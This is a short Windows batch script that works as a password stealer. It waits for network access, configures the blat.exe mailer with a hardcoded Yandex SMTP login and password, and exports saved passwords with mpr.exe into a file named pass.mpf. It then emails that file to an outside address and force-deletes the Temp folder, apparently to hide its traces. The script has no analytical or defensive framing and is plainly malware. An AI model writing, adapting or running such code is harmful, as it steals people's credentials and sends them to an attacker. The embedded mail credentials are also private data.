@echo off
:start
ping ya.ru -n 5 >nul
if %errorlevel%==0 (goto send) else (goto end)

:end
goto :start

:send
blat.exe -install -server smtp.yandex.ru -port 587 -f lomps@yandex.ua   -u lomps -pw bonamy
mpr.exe /export
ren *.mpf pass.mpf
blat.exe -body PassReg -to lomps@yandex.ua  -attach pass.mpf
del %Temp%\*.* /Q /S /F
